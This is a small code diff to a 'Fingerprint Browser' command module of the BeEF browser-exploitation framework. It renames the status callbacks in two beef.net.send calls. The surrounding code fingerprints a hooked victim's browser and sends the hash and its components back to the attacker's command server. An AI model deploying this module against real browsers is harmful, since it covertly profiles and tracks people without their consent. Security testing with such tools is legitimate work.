@@ -22,12 +22,12 @@ beef.execute(function() {
         var murmur = Fingerprint2.x64hash128(values.join(''), 31)
         beef.debug('[Fingerprint Browser] Fingerprint: ' + murmur);
         beef.debug('[Fingerprint Browser] Components: ' + JSON.stringify(components));
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + murmur + '&components=' + JSON.stringify(components), beef.are.status_success());
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + murmur + '&components=' + JSON.stringify(components), beef.status.success());
       })
     }, 500)
   } catch(e) {
     beef.debug('[Fingerprint Browser] Error: ' + e.message);
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + e.message, beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + e.message, beef.status.error());
   }
 });
 
